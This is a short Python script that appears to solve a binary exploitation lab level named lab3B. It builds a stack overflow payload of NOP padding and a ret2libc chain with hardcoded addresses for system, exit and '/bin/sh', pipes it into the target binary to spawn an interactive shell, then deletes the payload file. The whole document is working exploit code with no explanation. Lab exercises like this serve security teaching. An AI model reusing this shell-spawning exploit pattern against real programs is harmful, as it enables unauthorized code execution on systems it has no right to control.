import struct,os
offset=156
padding=b"\x90"*offset
eip=struct.pack("<I",0xb7e63190) # addr of system
retn=struct.pack("<I",0xb7e561e0) # addr of exit
argv=struct.pack("<I",0xb7e23000+0x160a24) # /bin/sh
f=open("/tmp/payload","wb")
f.write(padding+eip+retn+argv+b"\n")
f.close()
os.system("(cat /tmp/payload;cat) | /levels/lab03/lab3B")
os.system("rm -f /tmp/payload")
